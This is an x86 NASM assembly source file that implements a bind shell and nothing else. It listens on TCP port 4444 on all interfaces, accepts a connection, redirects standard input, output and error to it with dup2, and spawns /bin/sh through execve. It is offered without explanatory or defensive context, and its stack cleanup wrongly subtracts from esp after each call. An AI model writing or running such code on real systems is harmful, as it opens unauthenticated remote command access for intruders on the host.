extern socket
extern bind
extern listen
extern accept
extern dup2
extern execve
extern close
global main

section .text
main:

        push 0x0
        push 0x1 ; SOCK_STREAM
        push 0x2 ; AF_INET
        call socket
        sub esp,0xc
        mov [sockfd], eax

        mov word [servSA_sin_family], 0x2 ; AF_INET
        mov dword [servSA_sin_addr], 0x00000000 ; INADDR_ANY
        mov word [servSA_sin_port], 0x5c11 ; Port 4444 in network order

        push 0x10 ; size of sockaddr_in (16)
        push servSA_sin_family
        mov eax,dword [sockfd]
        push eax
        call bind
        sub esp,0xc

        push 0x2
        mov eax,dword [sockfd]
        push eax
        call listen
        sub esp,0x8

        push client_size ; size of client SA
        push servSA_sin_family
        mov eax,dword [sockfd]
        push eax
        call accept
        sub esp,0xc
        mov [newsockfd],eax

        push 0x0
        mov eax,dword [newsockfd]
        push eax
        call dup2
        sub esp,0x8

        push 0x1
        mov eax, dword [newsockfd]
        push eax
        call dup2
        sub esp,0x8

        push 0x2
        mov eax, dword [newsockfd]
        push eax
        call dup2
        sub esp,0x8

        push dword [exec_null]
        push exec_array
        push exec_string
        call execve
        sub esp,0xc



section .data

        sockfd:         dd 0x00000000
        newsockfd:      dd 0x00000000

        client_size: dd 0x10

        servSA_sin_family:      dw 0x0000
        servSA_sin_port:        dw 0x0000
        servSA_sin_addr:        dd 0x00000000
        servSA_sin_zero:        dd 0x00000000, 0x00000000

        exec_string: db "/bin/sh", 0x0
        exec_array: dd exec_string
        exec_null: dd 0x00000000
